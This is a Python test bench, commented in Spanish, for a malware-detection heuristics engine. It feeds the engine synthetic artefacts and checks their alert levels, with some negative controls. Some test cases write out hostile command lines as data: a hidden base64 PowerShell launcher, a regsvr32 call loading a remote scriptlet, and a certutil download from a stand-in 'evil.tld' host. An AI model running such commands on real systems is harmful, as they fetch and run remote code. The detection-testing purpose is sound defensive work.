#!/usr/bin/env python3
"""Banco de pruebas del motor de heuristicas.

Construye artefactos sinteticos que reproducen tecnicas reales de malware y
comprueba que cada uno alcanza el nivel esperado. No toca el sistema: solo
instancia objetos en memoria.

Un escaneo limpio no demuestra nada por si solo. Esto demuestra lo contrario:
que el motor sigue disparando cuando toca.

    python pruebas\\banco.py
"""

from __future__ import annotations

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from nucleo.modelos import ETIQUETA, Artefacto, Nivel
from reglas.heuristicas import evaluar

FIRMA_MS = {"estado": "Valid", "firmante": "Microsoft Windows", "es_microsoft": True,
            "confiable": True, "rota": False}
FIRMA_TERCERO = {"estado": "Valid", "firmante": "Acme Software SL", "es_microsoft": False,
                 "confiable": True, "rota": False}
SIN_FIRMA = {"estado": "NotSigned", "firmante": "", "es_microsoft": False,
             "confiable": False, "rota": False}
FIRMA_ROTA = {"estado": "HashMismatch", "firmante": "Adobe Inc.", "es_microsoft": False,
              "confiable": False, "rota": True}

PE_INYECTOR = {
    "maquina": "x64", "es_dll": False, "subsistema": "GUI", "compilado": "2026-01-01",
    "compilado_epoch": 1767225600, "aslr": True, "dep": True, "total_funciones": 40,
    "secciones": [], "seccion_empaquetador": [], "secciones_raras": [],
    "entropia_max_ejecutable": 6.4, "seccion_ejecutable_escribible": [],
    "funciones_planas": ["virtualallocex", "writeprocessmemory", "createremotethread",
                         "setthreadcontext", "isdebuggerpresent",
                         "checkremotedebuggerpresent"],
}

PE_EMPAQUETADO = {
    "maquina": "x86", "es_dll": False, "subsistema": "GUI", "compilado": "2010-03-04",
    "compilado_epoch": 1267660800, "aslr": False, "dep": False, "total_funciones": 3,
    "secciones": [], "seccion_empaquetador": ["upx0", "upx1"], "secciones_raras": [],
    "entropia_max_ejecutable": 7.85, "seccion_ejecutable_escribible": ["upx1"],
    "funciones_planas": ["loadlibrarya", "getprocaddress", "exitprocess"],
}

PE_LIMPIO = {
    "maquina": "x64", "es_dll": False, "subsistema": "consola", "compilado": "2025-06-01",
    "compilado_epoch": 1748736000, "aslr": True, "dep": True, "total_funciones": 120,
    "secciones": [], "seccion_empaquetador": [], "secciones_raras": [],
    "entropia_max_ejecutable": 6.1, "seccion_ejecutable_escribible": [],
    "funciones_planas": ["createfilew", "readfile", "writefile", "closehandle"],
}


# (descripcion, artefacto, nivel minimo esperado)
CASOS = [
    (
        "Ejecutable en %TEMP% con persistencia y empaquetado UPX",
        Artefacto(origen="Registro Run (HKCU)", nombre="SystemUpdate",
                  comando=r"C:\Users\ana\AppData\Local\Temp\svc32.exe",
                  ruta=r"C:\Users\ana\AppData\Local\Temp\svc32.exe",
                  existe=True, tamano=180_000, firma=SIN_FIRMA, pe=PE_EMPAQUETADO),
        Nivel.CRITICO,
    ),
    (
        "svchost.exe falso fuera de System32",
        Artefacto(origen="Tarea programada", nombre="\\Microsoft\\Windows\\SvcHost",
                  comando=r"C:\Users\ana\AppData\Roaming\svchost.exe",
                  ruta=r"C:\Users\ana\AppData\Roaming\svchost.exe",
                  existe=True, tamano=90_000, firma=SIN_FIRMA, pe=PE_INYECTOR),
        Nivel.CRITICO,
    ),
    (
        "PowerShell con carga base64 en el arranque",
        Artefacto(origen="Registro Run (HKCU)", nombre="Updater",
                  comando=("powershell.exe -nop -w hidden -enc "
                           "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"),
                  ruta=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                  existe=True, tamano=450_000, firma=FIRMA_MS, pe=PE_LIMPIO),
        Nivel.CRITICO,
    ),
    (
        "Binario legitimo troyanizado (firma no coincide)",
        Artefacto(origen="Servicio", nombre="AdobeUpdateSvc",
                  comando=r'"C:\Program Files\Adobe\updater.exe"',
                  ruta=r"C:\Program Files\Adobe\updater.exe",
                  existe=True, tamano=2_400_000, firma=FIRMA_ROTA, pe=PE_INYECTOR),
        Nivel.CRITICO,
    ),
    (
        "Secuestro de Winlogon Shell",
        Artefacto(origen="Winlogon (Shell)", nombre="Shell",
                  comando=r"explorer.exe, C:\ProgramData\wsc.exe",
                  ruta=r"C:\ProgramData\wsc.exe", existe=True, tamano=60_000,
                  firma=SIN_FIRMA, pe=PE_INYECTOR,
                  detalle={"esperado_por_defecto": "explorer.exe"}),
        Nivel.CRITICO,
    ),
    (
        "Doble extension .pdf.exe en carpeta de inicio",
        Artefacto(origen="Inicio (usuario)", nombre="factura.pdf.exe",
                  comando=r"C:\Users\ana\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\factura.pdf.exe",
                  ruta=r"C:\Users\ana\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\factura.pdf.exe",
                  existe=True, tamano=310_000, firma=SIN_FIRMA, pe=PE_EMPAQUETADO),
        Nivel.CRITICO,
    ),
    (
        "regsvr32 cargando scriptlet remoto (Squiblydoo)",
        Artefacto(origen="Tarea programada", nombre="\\WindowsUpdateCheck",
                  comando=r"regsvr32.exe /s /n /u /i:http://185.100.87.4/a.sct scrobj.dll",
                  ruta=r"C:\Windows\System32\regsvr32.exe", existe=True,
                  tamano=25_000, firma=FIRMA_MS, pe=PE_LIMPIO),
        Nivel.SOSPECHOSO,
    ),
    (
        "Persistencia por suscripcion WMI",
        Artefacto(origen="WMI CommandLineEventConsumer", nombre="BotConsumer",
                  comando=r"cmd.exe /c powershell -w hidden -e ZQBjAGgAbwA=",
                  ruta=None, detalle={"clase": "CommandLineEventConsumer"}),
        Nivel.SOSPECHOSO,
    ),
    (
        "IFEO: depurador enganchado a taskmgr.exe",
        Artefacto(origen="IFEO Debugger", nombre="taskmgr.exe",
                  comando=r"C:\Windows\System32\calc.exe",
                  ruta=r"C:\Windows\System32\calc.exe", existe=True,
                  tamano=30_000, firma=FIRMA_MS, pe=PE_LIMPIO,
                  detalle={"binario_secuestrado": "taskmgr.exe"}),
        Nivel.SOSPECHOSO,
    ),
    (
        "certutil descargando carga util",
        Artefacto(origen="Registro Run (HKLM)", nombre="Cert",
                  comando=r"certutil.exe -urlcache -split -f http://evil.tld/p.exe %TEMP%\p.exe",
                  ruta=r"C:\Windows\System32\certutil.exe", existe=True,
                  tamano=1_500_000, firma=FIRMA_MS, pe=PE_LIMPIO),
        Nivel.SOSPECHOSO,
    ),
    # --- Controles negativos: NO deben alarmar ---
    (
        "explorer.exe de Microsoft (inyecta y engancha teclado, legitimamente)",
        Artefacto(origen="Proceso vivo", nombre="explorer.exe",
                  comando=r"C:\Windows\Explorer.EXE",
                  ruta=r"C:\Windows\explorer.exe", existe=True,
                  tamano=5_000_000, firma=FIRMA_MS, pe=PE_INYECTOR),
        Nivel.LIMPIO,
    ),
    (
        "Servicio de tercero firmado en Program Files",
        Artefacto(origen="Servicio", nombre="AcmeSync",
                  comando=r'"C:\Program Files\Acme\sync.exe" --service',
                  ruta=r"C:\Program Files\Acme\sync.exe", existe=True,
                  tamano=900_000, firma=FIRMA_TERCERO, pe=PE_INYECTOR),
        Nivel.INFO,
    ),
    (
        "Windows Defender en subcarpeta de ProgramData",
        Artefacto(origen="Servicio", nombre="WinDefend",
                  comando=r'"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18\MsMpEng.exe"',
                  ruta=r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18\MsMpEng.exe",
                  existe=True, tamano=3_000_000, firma=FIRMA_MS, pe=PE_INYECTOR),
        Nivel.LIMPIO,
    ),
]


def main() -> int:
    try:
        sys.stdout.reconfigure(encoding="utf-8")
    except Exception:
        pass

    print("\n  BANCO DE PRUEBAS DEL MOTOR DE HEURISTICAS\n")
    fallos = 0

    for descripcion, artefacto, esperado in CASOS:
        evaluar(artefacto)
        negativo = esperado <= Nivel.INFO
        ok = artefacto.nivel <= esperado if negativo else artefacto.nivel >= esperado

        marca = "OK  " if ok else "FALLO"
        print(f"  [{marca}] {artefacto.puntos:>3} pts  {ETIQUETA[artefacto.nivel]:<11} {descripcion}")
        if not ok:
            fallos += 1
            comparador = "como maximo" if negativo else "al menos"
            print(f"          esperado {comparador} {ETIQUETA[esperado]}")
            for s in sorted(artefacto.senales, key=lambda x: -x.puntos):
                print(f"          · {s.puntos:>+4}  {s.titulo}")

    total = len(CASOS)
    print(f"\n  {total - fallos}/{total} casos correctos\n")
    return 1 if fallos else 0


if __name__ == "__main__":
    sys.exit(main())
